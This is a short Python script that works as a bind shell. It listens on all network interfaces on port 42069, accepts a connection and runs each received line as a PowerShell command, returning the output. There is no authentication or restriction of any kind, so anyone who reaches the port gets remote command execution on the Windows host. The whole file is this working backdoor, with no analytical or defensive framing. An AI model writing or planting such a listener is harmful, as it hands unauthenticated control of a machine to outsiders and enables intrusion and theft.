import socket
import subprocess

HOST = '0.0.0.0' # Listen on all network interfaces
PORT = 42069    # Choose a port number

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f"Listening on {HOST}:{PORT}")

conn, addr = s.accept()
print(f"Connected by {addr}")

while True:
    command = conn.recv(1024).decode().strip()
    if not command:
        break

    # Execute the PowerShell command and send the output back to the client
    try:
        output = subprocess.check_output(['powershell.exe', '-NoLogo', '-NoProfile', '-NonInteractive', '-Command', command], stderr=subprocess.STDOUT, timeout=10)
        conn.sendall(output)
    except subprocess.CalledProcessError as e:
        conn.sendall(e.output)
    except subprocess.TimeoutExpired:
        conn.sendall(b"Command timed out\n")
    except Exception as e:
        conn.sendall(str(e).encode())

conn.close()